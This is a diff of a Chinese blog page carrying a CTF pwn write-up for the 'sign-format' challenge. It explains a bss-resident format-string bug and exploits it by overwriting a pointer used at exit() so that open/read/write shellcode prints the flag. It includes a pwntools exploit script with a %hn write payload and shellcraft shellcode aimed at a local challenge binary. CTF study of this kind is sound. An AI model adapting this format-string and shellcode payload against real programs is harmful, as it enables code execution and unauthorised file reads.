@@ -21,16 +21,16 @@
   <meta name="author" content="暮夜">
   <meta name="keywords" content="">
   
-    <meta name="description" content="20222023sign-format 题源：sign-format 考点：shellcode（&#x2F;orw）+ bss段format_string + 篡改**exit() 执行时的 dlfiini**  源码关闭了输出流，存在非栈上格式化字符串漏洞。  写入地址具有可执行权限。  分析**思路**：在bss段布置shellcode，劫持程序执行流转到输入地址。 **具体：在bss段布置来">
+    <meta name="description" content="20222023sign-format 题源：sign-format 考点：shellcode（&#x2F;orw）+ bss段format_string + 篡改**exit() 执行时的 dlfiini**  源码关闭了输出流，存在非栈上格式化字符串漏洞。 写入地址具有可执行权限。  分析**思路**：在bss段布置shellcode，劫持程序执行流转到输入地址。 **具体：在bss段布置来实">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2024金盾信安杯_PWN">
 <meta property="og:url" content="https://12yhy3.github.io/2024/12/02/2024-jdxa/index.html">
 <meta property="og:site_name" content="Darkness_Sword">
-<meta property="og:description" content="20222023sign-format 题源：sign-format 考点：shellcode（&#x2F;orw）+ bss段format_string + 篡改**exit() 执行时的 dlfiini**  源码关闭了输出流，存在非栈上格式化字符串漏洞。  写入地址具有可执行权限。  分析**思路**：在bss段布置shellcode，劫持程序执行流转到输入地址。 **具体：在bss段布置来">
+<meta property="og:description" content="20222023sign-format 题源：sign-format 考点：shellcode（&#x2F;orw）+ bss段format_string + 篡改**exit() 执行时的 dlfiini**  源码关闭了输出流，存在非栈上格式化字符串漏洞。 写入地址具有可执行权限。  分析**思路**：在bss段布置shellcode，劫持程序执行流转到输入地址。 **具体：在bss段布置来实">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://12yhy3.github.io/img/jdxa.jpg">
 <meta property="article:published_time" content="2024-12-02T00:42:00.000Z">
-<meta property="article:modified_time" content="2024-12-02T00:49:48.711Z">
+<meta property="article:modified_time" content="2024-12-02T03:03:46.559Z">
 <meta property="article:author" content="暮夜">
 <meta property="article:tag" content="&lt;span class&#x3D;&quot;label label-primary&quot;&gt;PWN&lt;&#x2F;span&gt;">
 <meta name="twitter:card" content="summary_large_image">
@@ -352,7 +352,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2024年12月2日 早上
+                    本文最后更新于 2024年12月2日 上午
                   
                 
               </p>
@@ -365,9 +365,8 @@
 <p>考点：shellcode（&#x2F;orw）+ <font style="color:#DF2A3F;">bss段</font><strong><font style="color:#DF2A3F;">format_string</font></strong> + 篡改**<font style="color:#DF2A3F;">exit() 执行时的 dlfiini</font>**</p>
 </blockquote>
 <h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>关闭了输出流，存在非栈上格式化字符串漏洞。</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1709023714645-f64f5ac5-fd44-4ba4-8b03-ad8cbee34a89.png" srcset="/img/loading.gif" lazyload></p>
-<p>写入地址具有可执行权限。</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1709023721965-593fb114-569d-4d20-995d-67cee35da668.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240227164752.png" srcset="/img/loading.gif" lazyload><br>写入地址具有可执行权限。</p>
+<p><img src="/images/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240227164810.png" srcset="/img/loading.gif" lazyload></p>
 <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>**<font style="color:#DF2A3F;">思路</font>**：在bss段布置shellcode，劫持程序执行流转到输入地址。</p>
 <p>**<font style="color:#601BDE;">具体</font><strong>：在bss段布置来实现执行shellcode（orw）的跳板，之后</strong><font style="color:#DF2A3F;">修改dlfini的rsi偏移来指向orw执行的地址</font>**即可，后续程序执行到 exit() 退出时候会读出flag。</p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>r=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>s= shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag&quot;</span>,<span class="hljs-number">0</span>)<br>s+= shellcraft.read(<span class="hljs-number">1</span>,<span class="hljs-number">0x4040b0</span> + <span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>)<br>s+= shellcraft.write(<span class="hljs-number">2</span>,<span class="hljs-number">0x4040b0</span> + <span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>)<br><span class="hljs-comment">#------------------------不懂-----------------------------</span><br>p = <span class="hljs-string">b&quot;%776c%30$hn&quot;</span>   <span class="hljs-comment"># 776 = 0x308</span><br>p = p.ljust(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>p += p64(<span class="hljs-number">0x4040b8</span>)<br>p += <span class="hljs-string">b&quot;\x90&quot;</span>*<span class="hljs-number">0x10</span><br><span class="hljs-comment">#-----------------------------------------------------</span><br>p += asm(s)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(p))<br>r.sendafter(<span class="hljs-string">b&quot;Let&#x27;s start!\n&quot;</span>,p)<br>r.interactive()<br></code></pre></td></tr></table></figure>
